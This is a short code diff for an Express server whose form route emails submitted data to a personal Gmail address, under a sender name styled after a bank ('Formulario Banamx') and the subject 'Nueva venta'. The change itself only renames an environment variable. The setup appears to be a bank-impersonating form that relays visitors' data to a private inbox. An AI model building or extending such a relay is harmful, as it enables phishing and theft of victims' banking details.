@@ -37,7 +37,7 @@ app.post('/enviar-formulario', async (req, res) => {
 
   try {
     await transporter.sendMail({
-      from: `"Formulario Banamx" <${process.env.EMAIL_USER}>`,
+      from: `"Formulario Banamx" <${process.env.BREVO_USER}>`,
       to: 'madbox2026@gmail.com',
       subject: 'Nueva venta',
       text: 'Adjunto los datos del formulario.',
@@ -61,6 +61,7 @@ const PORT = process.env.PORT;
 app.listen(PORT, () => {
   console.log(`Servidor corriendo en http://localhost:${PORT}`);
 });
+
 
 
 
